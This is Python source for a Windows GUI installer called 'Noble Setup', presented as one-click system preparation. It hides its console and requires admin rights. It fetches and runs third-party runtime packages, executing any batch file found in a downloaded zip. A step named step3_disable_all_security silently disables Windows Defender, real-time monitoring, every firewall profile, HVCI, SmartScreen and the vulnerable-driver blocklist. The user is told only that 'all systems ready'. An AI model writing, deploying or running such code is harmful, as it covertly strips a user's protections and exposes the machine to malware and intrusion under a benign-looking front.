import sys
if sys.platform == 'win32':
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# ... rest of your imports
import tkinter as tk
from tkinter import messagebox
import threading
import os
import urllib.request
import zipfile
import subprocess
import tempfile
import shutil
import time
import winreg
import ctypes

class NobleSetup:
    def __init__(self, root):
        self.root = root
        self.root.title("Noble Setup")
        self.root.geometry("400x200")
        self.root.configure(bg="#0a0a0f")
        self.root.resizable(False, False)
        
        self.root.update_idletasks()
        x = (self.root.winfo_screenwidth() // 2) - (400 // 2)
        y = (self.root.winfo_screenheight() // 2) - (200 // 2)
        self.root.geometry(f"400x200+{x}+{y}")
        
        self.download_dir = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), "BraxInstaller")
        os.makedirs(self.download_dir, exist_ok=True)
        self.is_running = False
        
        if not self.is_admin():
            messagebox.showerror("Admin Required", "Run as Administrator")
            self.root.destroy()
            return
        
        self.setup_ui()
        
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
        
    def setup_ui(self):
        main_frame = tk.Frame(self.root, bg="#0a0a0f")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=15)
        
        title = tk.Label(main_frame, text="NOBLE SETUP", 
                        font=("Segoe UI", 20, "bold"), bg="#0a0a0f", fg="#00d4ff")
        title.pack(pady=(10, 5))
        
        subtitle = tk.Label(main_frame, text="One-Click System Preparation", 
                           font=("Segoe UI", 9), bg="#0a0a0f", fg="#8899a6")
        subtitle.pack(pady=(0, 15))
        
        self.run_btn = tk.Button(main_frame, text="RUN SETUP", 
                                  font=("Segoe UI", 14, "bold"),
                                  bg="#00d4ff", fg="#0a0a0f",
                                  activebackground="#00a8cc", activeforeground="#0a0a0f",
                                  relief=tk.FLAT, bd=0, padx=30, pady=12,
                                  cursor="hand2",
                                  command=self.run_setup)
        self.run_btn.pack(fill=tk.X, pady=10)
        
        self.run_btn.bind("<Enter>", lambda e: self.run_btn.config(bg="#00a8cc"))
        self.run_btn.bind("<Leave>", lambda e: self.run_btn.config(bg="#00d4ff"))
        
        footer = tk.Label(main_frame, text="brax@support dev", 
                         font=("Segoe UI", 7), bg="#0a0a0f", fg="#333344")
        footer.pack(side=tk.BOTTOM, pady=(10, 0))
        
    def download_file(self, url, dest_path):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=120) as response:
                with open(dest_path, 'wb') as f:
                    while True:
                        if not self.is_running:
                            return False
                        chunk = response.read(8192)
                        if not chunk:
                            break
                        f.write(chunk)
            return True
        except:
            return False
            
    def extract_zip(self, zip_path, extract_to, password=None):
        try:
            with zipfile.ZipFile(zip_path, 'r') as zf:
                if password:
                    zf.extractall(extract_to, pwd=password.encode('utf-8'))
                else:
                    zf.extractall(extract_to)
            return True
        except:
            return False
            
    def run_file_visible(self, file_path):
        try:
            if not os.path.exists(file_path):
                return False
            os.startfile(file_path)
            time.sleep(8)
            return True
        except:
            return False
            
    def step1_visual_cpp(self):
        url = "https://us1-dl.techpowerup.com/files/TFl1z24nLT-xg12pijCPOA/1778485899/Visual-C-Runtimes-All-in-One-Dec-2025.zip"
        zip_path = os.path.join(self.download_dir, "vc_runtimes.zip")
        extract_path = os.path.join(self.download_dir, "vc_runtimes")
        
        if not self.download_file(url, zip_path):
            return False
            
        if os.path.exists(extract_path):
            shutil.rmtree(extract_path)
        os.makedirs(extract_path, exist_ok=True)
        
        if not self.extract_zip(zip_path, extract_path):
            return False
            
        bat_file = None
        for root, dirs, files in os.walk(extract_path):
            for file in files:
                if file.lower() == "install_all.bat":
                    bat_file = os.path.join(root, file)
                    break
            if bat_file:
                break
                
        if not bat_file:
            for root, dirs, files in os.walk(extract_path):
                for file in files:
                    if file.lower().endswith(('.bat', '.cmd')):
                        bat_file = os.path.join(root, file)
                        break
                if bat_file:
                    break
            
        if bat_file:
            if not self.run_file_visible(bat_file):
                return False
        else:
            os.startfile(extract_path)
            
        return True
        
    def step2_directx(self):
        url = "https://download.microsoft.com/download/1/7/1/1718ccc4-6315-4d8e-9543-8e28a4e18c4c/dxwebsetup.exe"
        exe_path = os.path.join(self.download_dir, "dxwebsetup.exe")
        
        if not self.download_file(url, exe_path):
            return False
            
        if not self.run_file_visible(exe_path):
            return False
            
        return True
        
    def step3_disable_all_security(self):
        # Defender registry
        try:
            reg_cmd = ('powershell "Set-ItemProperty -Path \\"HKLM:\\SOFTWARE\\Policies\\Microsoft'
                      '\\Windows Defender\\" -Name \\"DisableAntiSpyware\\" -Value 1 -Type DWord -Force"')
            subprocess.run(reg_cmd, capture_output=True, shell=True)
        except:
            pass
        
        # Real-time monitoring
        try:
            r = subprocess.run('powershell "Set-MpPreference -DisableRealtimeMonitoring $true"',
                              capture_output=True, text=True, shell=True)
            if r.returncode != 0 and ("Provider load failure" in r.stderr or "0x80041013" in r.stderr):
                pass
        except:
            pass
        
        # Stop service
        try:
            r = subprocess.run('powershell "Stop-Service -Name WinDefend -Force"',
                              capture_output=True, text=True, shell=True)
            if r.returncode != 0 and ("NoServiceFoundForGivenName" in r.stderr or "Cannot find any service" in r.stderr):
                pass
        except:
            pass
        
        # Firewall
        try:
            cmds = [
                'powershell "Set-ItemProperty -Path \\"HKLM:\\SYSTEM\\CurrentControlSet\\Services'
                '\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\" -Name \\"EnableFirewall\\" -Value 0"',
                'powershell "Set-ItemProperty -Path \\"HKLM:\\SYSTEM\\CurrentControlSet\\Services'
                '\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\\" -Name \\"EnableFirewall\\" -Value 0"',
                'powershell "Set-ItemProperty -Path \\"HKLM:\\SYSTEM\\CurrentControlSet\\Services'
                '\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\" -Name \\"EnableFirewall\\" -Value 0"',
            ]
            for cmd in cmds:
                subprocess.run(cmd, capture_output=True, shell=True)
            
            ps = ('powershell "Set-NetFirewallProfile '
                  '-DefaultInboundAction Allow -DefaultOutboundAction Allow -Enabled False"')
            subprocess.run(ps, capture_output=True, shell=True)
        except:
            pass
        
        # Exploit Protection
        try:
            base_key = winreg.HKEY_LOCAL_MACHINE
            path = (r"SOFTWARE\Policies\Microsoft\Windows Defender Security Center"
                    r"\App and Browser protection")
            key = winreg.CreateKeyEx(base_key, path, 0, winreg.KEY_WRITE | winreg.KEY_READ)
            winreg.SetValueEx(key, "DisallowExploitProtectionOverride", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
        
        # HVCI
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity")
            winreg.SetValueEx(key, "Enabled", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except:
            pass
        
        # SmartScreen
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Policies\Microsoft\Windows\System")
            winreg.SetValueEx(key, "EnableSmartScreen", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer")
            winreg.SetValueEx(key, "SmartScreenEnabled", 0, winreg.REG_SZ, "Off")
            winreg.CloseKey(key)
        except:
            pass
        
        # Driver Blocklist
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\CI\Config")
            winreg.SetValueEx(key, "VulnerableDriverBlocklistEnabled", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except:
            pass
        
        return True
        
    def installation_thread(self):
        self.is_running = True
        self.run_btn.config(state=tk.DISABLED, text="RUNNING...", bg="#1a1a2e", fg="#8899a6")
        
        try:
            if not self.step1_visual_cpp():
                self.run_btn.config(state=tk.NORMAL, text="RUN SETUP", bg="#00d4ff", fg="#0a0a0f")
                return
                
            if not self.step2_directx():
                self.run_btn.config(state=tk.NORMAL, text="RUN SETUP", bg="#00d4ff", fg="#0a0a0f")
                return
                
            if not self.step3_disable_all_security():
                self.run_btn.config(state=tk.NORMAL, text="RUN SETUP", bg="#00d4ff", fg="#0a0a0f")
                return
                
            self.run_btn.config(text="DONE", bg="#2ed573", fg="#0a0a0f", state=tk.NORMAL)
            messagebox.showinfo("Complete", "Noble Setup finished!\n\nAll systems ready.")
                
        except Exception as e:
            self.run_btn.config(state=tk.NORMAL, text="RUN SETUP", bg="#00d4ff", fg="#0a0a0f")
            messagebox.showerror("Error", f"Setup failed:\n{str(e)}")
            
        finally:
            self.is_running = False
            if self.run_btn['text'] == "RUNNING...":
                self.run_btn.config(state=tk.NORMAL, text="RUN SETUP", bg="#00d4ff", fg="#0a0a0f")
        
    def run_setup(self):
        if self.is_running:
            return
        thread = threading.Thread(target=self.installation_thread, daemon=True)
        thread.start()

def main():
    root = tk.Tk()
    app = NobleSetup(root)
    root.mainloop()

if __name__ == "__main__":
    main()
